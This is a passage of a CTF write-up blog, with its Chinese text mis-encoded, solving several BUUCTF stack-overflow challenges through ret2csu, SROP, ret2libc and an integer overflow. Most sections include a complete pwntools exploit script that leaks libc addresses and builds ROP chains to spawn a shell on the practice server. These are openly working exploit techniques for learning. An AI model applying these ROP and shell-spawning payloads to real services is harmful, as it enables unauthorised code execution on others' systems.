alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°<code>0x7fffffffdc60</code>ä¸Šå‚¨å­˜çš„å†…å®¹å³ä¸º<code>old_rbp</code>ï¼Œ<code>0x7fffffffdc68</code>ä¸Šå‚¨å­˜çš„å†…å®¹ä¸ºmainå‡½æ•°ä¸­çš„<code>call vuln</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œè€Œ<code>0x7fffffffdc70</code>ä¸Šå‚¨å­˜çš„åˆ™æ˜¯ä¸€ä¸ª<strong>åœ°å€</strong>ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“è®¡ç®—å¾—å‡ºå…¶ä¸æ ˆåŸºå€é—´çš„åç§»é‡ä¸º<strong>0x7fffffffdd78 - 0x7fffffffdc60 &#x3D; 0x118</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¯»å–è¿™ä¸ªå€¼å†å‡å»åç§»é‡ä¾¿å¯ä»¥<strong>å¾—åˆ°æ ˆåŸºå€çš„åœ°å€</strong></p><h2 id="è§£æ³•1ï¼šret2csu"><a href="#è§£æ³•1ï¼šret2csu" class="headerlink" title="è§£æ³•1ï¼šret2csu"></a>è§£æ³•1ï¼šret2csu</h2><p>è€ƒè™‘åˆ°å­˜åœ¨<strong>59å·ç³»ç»Ÿè°ƒç”¨execve</strong>ï¼Œæ•…è€ƒè™‘æ„é€ ropé“¾é€šè¿‡<code>execve(&quot;/bin/sh&quot;,0,0)</code>ä»¥getshell</p><p>æ–‡ä»¶ä¸­ä¸å­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²ï¼Œç”±äºæ ˆåŸºå€å¯çŸ¥ï¼Œæ•…è€ƒè™‘æ‰‹åŠ¨è¾“å…¥åˆ°æ ˆä¸Š</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨csuä¸­çš„gadgetå…ˆå°†r13ã€r14ç½®ä¸º0ï¼Œä¹‹åå†<code>mov rdx,r13;mov rsi,r14</code>å°†rsiå’Œrdxç½®ä¸º0</p><p>ç”±äºè¿™ä¸ªgadgetè¿è¡Œåˆ°åé¢ä¼šæ‰§è¡Œ<code>call [r12 + 8*rsp]</code>ï¼ˆrspå·²è¢«ç½®0ï¼Œæ•…å®é™…æ•ˆæœæ˜¯æ‰§è¡Œ&#96;&#96;&#96;call [r12]&#96;&#96;ï¼‰ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦åœ¨r12å†…æ”¾å…¥ä¸€ä¸ªå­˜æœ‰é€‚åˆæŒ‡ä»¤çš„åœ°å€çš„åœ°å€ï¼Œè¿™é‡Œç”±äºæ­¤å‰æˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ªå¸¦æœ‰retçš„gadgetçš„åœ°å€åå°†r12ç½®ä¸ºè¯¥æ ˆä¸Šåœ°å€å³å¯ç»§ç»­æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œ<strong>éœ€è¦æ³¨æ„çš„æ˜¯callæŒ‡ä»¤ä¼šå¾€æ ˆä¸Šå‹å…¥å½“å‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†ä¹‹å¼¹å‡ºæ ˆ</strong></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mov_rax_59_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = <span class="number">0x400580</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28147</span>)<span class="comment">#process(&#x27;./ciscn_s_3&#x27;)# </span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">sh_addr = stack_addr + <span class="number">8</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(sh_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 =  p64(pop_rdi_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(stack_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12)</span><br><span class="line">payload2 += p64(mov_rax_59_ret) + p64(pop_rdi_ret) + p64(sh_addr)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¯getshell</p><p><img src="https://i.loli.net/2020/11/28/cCwJmaSEt5Kxqeg.png" alt="image.png"></p><h2 id="è§£æ³•2ï¼šSROP"><a href="#è§£æ³•2ï¼šSROP" class="headerlink" title="è§£æ³•2ï¼šSROP"></a>è§£æ³•2ï¼šSROP</h2><blockquote><p><del>è¯•äº†å¥½å‡ ç§å§¿åŠ¿éƒ½æ²¡å¼„å‡ºæ¥ï¼Œç¦»è°±</del></p><p><del>éš¾é“SROPé€€å‡ºå†å²èˆå°äº†ğŸ</del></p><p>æ˜¯æˆ‘å‚»äº†ï¼Œæˆ‘ç»™å¼„æˆstr().encode()äº†ï¼Œåº”è¯¥ç”¨bytes()â€¦</p><p><del>æ—©çŸ¥é“è‡ªå·±æ‰‹æ’•ä¸€ä¸ªframeå¯èƒ½è¿˜å¥½ç‚¹</del></p></blockquote><p>å‰é¢çš„è§£æ³•æˆ‘ä»¬ä½¿ç”¨äº†gadgetä¸­ç»™å‡ºçš„59å·ç³»ç»Ÿè°ƒç”¨<code>execve</code>ï¼Œè¿™ä¸ªè§£æ³•åˆ™æ˜¯ä½¿ç”¨äº†gadgetä¸­ç»™å‡ºçš„å¦å¤–ä¸€ä¸ª15å·ç³»ç»Ÿè°ƒç”¨<code>rt_sigreturn</code></p><p>ç³»ç»Ÿè°ƒç”¨<code>rt_sigreturn</code>ç”¨äºæ¢å¤ç”¨æˆ·æ€çš„å¯„å­˜å™¨çŠ¶æ€ï¼Œä»æ ˆä¸Šä¿å­˜çš„æ•°æ®æ¥æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€</p><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ä¹‹å‰ï¼Œç³»ç»Ÿä¼šå°†å½“å‰è¿›ç¨‹çš„å¯„å­˜å™¨çŠ¶æ€å‹å…¥æ ˆä¸­ï¼Œå°†<code>rt_sigreturn</code>ä½œä¸ºè¿”å›åœ°å€ä¸€å¹¶å‹å…¥ï¼›ä»å†…æ ¸æ€åˆ‡å›ç”¨æˆ·æ€æ—¶ä¾¿é€šè¿‡æ ˆä¸Šçš„æ•°æ®æ¥æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€ï¼Œå¤§è‡´å¸ƒå±€å¦‚ä¸‹ï¼š</p><p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ªSigreturnFrameæ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,0,0)å³å¯</p><p>ä½¿ç”¨pwntoolsä¸­çš„SigreturnFrameå·¥å…·å¯ä»¥å¿«é€Ÿæ„é€ ä¸€ä¸ª fake frame</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26063</span>)<span class="comment"># process(&#x27;./ciscn_s_3&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">mov_rax_15_ret = <span class="number">0x4004da</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">log.info(<span class="string">&quot;stack addr: &quot;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = stack_leak</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(mov_rax_15_ret) + p64(syscall_addr) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/11/29/CJxnp4FVN6RoujY.png" alt="image.png"></p><blockquote><p>SROP(Sigreturn Oriented Programming)æŠ€æœ¯åˆ©ç”¨äº†ç±»Unixç³»ç»Ÿä¸­çš„Signalæœºåˆ¶ï¼Œå¦‚å›¾ï¼š</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" alt="img"></a></p><ol><li>å½“ä¸€ä¸ªç”¨æˆ·å±‚è¿›ç¨‹å‘èµ·signalæ—¶ï¼Œæ§åˆ¶æƒåˆ‡åˆ°å†…æ ¸å±‚</li><li>å†…æ ¸ä¿å­˜è¿›ç¨‹çš„ä¸Šä¸‹æ–‡(å¯¹æˆ‘ä»¬æ¥è¯´é‡è¦çš„å°±æ˜¯å¯„å­˜å™¨çŠ¶æ€)åˆ°ç”¨æˆ·çš„æ ˆä¸Šï¼Œç„¶åå†æŠŠrt_sigreturnåœ°å€å‹æ ˆï¼Œè·³åˆ°ç”¨æˆ·å±‚æ‰§è¡ŒSignal Handlerï¼Œå³è°ƒç”¨rt_sigreturn</li><li>rt_sigreturnæ‰§è¡Œå®Œï¼Œè·³åˆ°å†…æ ¸å±‚</li><li>å†…æ ¸æ¢å¤â‘¡ä¸­ä¿å­˜çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œæ§åˆ¶æƒäº¤ç»™ç”¨æˆ·å±‚è¿›ç¨‹</li></ol><p><a href="https://xz.aliyun.com/t/5240">å…ˆçŸ¥ç¤¾åŒº-SROP exploit</a></p></blockquote><h1 id="0x018-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc"><a href="#0x018-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc" class="headerlink" title="0x018.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc"></a>0x018.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p><p><img src="https://i.loli.net/2020/10/19/2FfsUenMSKoQ7qY.png" alt="image.png"></p><p>æ‹–å…¥IDAåˆ†æ</p><p><img src="https://i.loli.net/2020/10/19/PDEMKizc5g2HIyl.png" alt="image.png"></p><p>ç›´æ¥ç»™äº†ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘æ„é€ ropé“¾å…ˆæ³„éœ²readå‡½æ•°çœŸå®åœ°å€å†ä½¿ç”¨LibcSearcherå¯»æ‰¾Libcç‰ˆæœ¬æœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ä»¥getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;,28409)#process(&#x27;./2018_rop&#x27;)</span><br><span class="line">e = ELF(&#x27;./2018_rop&#x27;)</span><br><span class="line">offset = 0x88</span><br><span class="line">read_got = e.got[&#x27;read&#x27;]</span><br><span class="line">write_plt = e.plt[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">payload1 = offset * b&#x27;A&#x27; + p32(0xdeadbeef) + p32(write_plt) + p32(0x8048474) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">read_str = p.recv(4).ljust(4,b&#x27;\x00&#x27;)</span><br><span class="line">print(read_str)</span><br><span class="line">read_addr = u32(read_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(&#x27;read&#x27;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">sh_addr = libc_base  + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = offset * b&#x27;A&#x27; + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/19/5HYQqUcMGavCsdS.png" alt="image.png"></p><h1 id="0x019-bjdctf-2020-babyrop-ret2csu-ret2libc"><a href="#0x019-bjdctf-2020-babyrop-ret2csu-ret2libc" class="headerlink" title="0x019.bjdctf_2020_babyrop - ret2csu + ret2libc"></a>0x019.bjdctf_2020_babyrop - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œåªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/11/15/zhfrI8Kpij7NWT6.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/11/15/cmGeARE3V18x9H2.png" alt="image.png"></p><p>å¯ä»¥å‘ç°åœ¨<code>vuln()</code>å‡½æ•°å¤„å­˜åœ¨æ ˆæº¢å‡º</p><p>ç”±äºæ²¡æœ‰åé¢å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28167</span>) <span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_str = p.recvuntil(<span class="string">b&#x27;\nPull up&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_str)</span><br><span class="line">puts_addr = u64(puts_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/11/15/S46DkWpHcz5qLiF.png" alt="image.png"></p><h1 id="0x01A-pwn2-sctf-2016-integer-overflow-ret2libc"><a href="#0x01A-pwn2-sctf-2016-integer-overflow-ret2libc" class="headerlink" title="0x01A.pwn2_sctf_2016 - integer overflow + ret2libc"></a>0x01A.pwn2_sctf_2016 - integer overflow + ret2libc</h1><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p><p>![0QJ_UK7O_A2KJOURYNP&#96;_KW.png](<a href="https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png">https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png</a>)</p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>åœ¨<code>vuln()</code>å‡½æ•°ä¸­ä½¿ç”¨<code>get_n()</code>å‡½æ•°è¯»å…¥4å­—èŠ‚å¹¶ä½¿ç”¨<code>atoi()</code>è½¬ä¸ºæ•°å­—ï¼Œè‹¥æ˜¯å¤§äº32åˆ™é€€å‡ºï¼Œå¦åˆ™å†ä¸€æ¬¡è°ƒç”¨<code>get_n()</code>å‡½æ•°è¿›è¡Œè¯»å…¥</p><p>![A&#96;GN6_COM3ZZ5BGCO0P1~AK.png](<a href="https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png">https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png</a>)</p><p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>get_n()</code>å‡½æ•°ä¸­ï¼Œå…¶æ‰€æ¥æ”¶çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>unsigned int</code>ï¼Œè‹¥æ˜¯æˆ‘ä»¬è¯»å…¥æ•°å­—<code>-1</code>åˆ™ä¼šå‘ç”Ÿæ•´æ•°æº¢å‡ºå˜æˆä¸€ä¸ªå·¨å¤§çš„æ­£æ•°ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œä¾¿å­˜åœ¨æº¢å‡ºç‚¹äº†</p><p><img src="https://i.loli.net/2020/10/09/Iy2iukBamRfXd1x.png" alt="SH@J5_XNE_9R_DEH0R_A_T0.png"></p><p>æ–‡ä»¶æœ¬èº«ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„å‡½æ•°ï¼ˆå¹¶ä¸”é™„èµ äº†ä¸€å †æ²¡ç”¨çš„gadgetï¼‰ï¼Œæ•…è€ƒè™‘<strong>ret2libc</strong>ï¼Œé¦–å…ˆæ³„æ¼å‡ºprintfå‡½æ•°åœ°å€ï¼Œå†ä½¿ç”¨LibcSearcherå¾—åˆ°libcï¼Œæœ€åæ„é€ <code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>ç¨‹åºä¸­å­˜åœ¨<code>%s</code>å­—ç¬¦ä¸²ä¾›æ‰“å°</p><p><img src="https://i.loli.net/2020/10/09/MzHjLZfqXTpBxaF.png" alt="1__H@0HQW54N_D27DI_SM_3.png"></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804A040</span></span><br><span class="line">fmtstr_addr = <span class="number">0x8048702</span></span><br><span class="line">printf_got = e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(printf_plt) + p32(main_addr) + p32(fmtstr_addr) + p32(printf_got)</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29032</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;You said&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) +  <span class="number">5</span>*p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/10/09/3pdunR4j1yBtrOL.png" alt="E@O1G4DY_S2_DR_2J_0E__O.png"></p><h1 id="0x01B-others-shellcode"><a href="#0x01B-others-shellcode" class="headerlink" title="0x01B.others_shellcode"></a>0x01B.others_shellcode</h1><p>ç›´æ¥è¿æ¥å°±æœ‰flagäº†â€¦</p><p><img src="https://i.loli.net/2020/11/15/ci6yp5J3jWVagZK.png" alt="image.png"></p><h1 id="0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><a href="#0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc" class="headerlink" title="0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc"></a>0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NX</p><p><img src="https://i.loli.net/2020/10/09/dhNruafBqwiGHj7.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/10/09/BAIuUsgEq8VkCD2.png" alt="image.png"></p><p>ä¸»å‡½æ•°ä¸­å­˜åœ¨æº¢å‡ºï¼Œä¸è¿‡æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆä½¿ç”¨printfæ³„éœ²readå‡½æ•°åœ°å€å†ç”¨LibcSearcherå¾—åˆ°libcæœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">fmtstr = <span class="number">0x400790</span></span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span 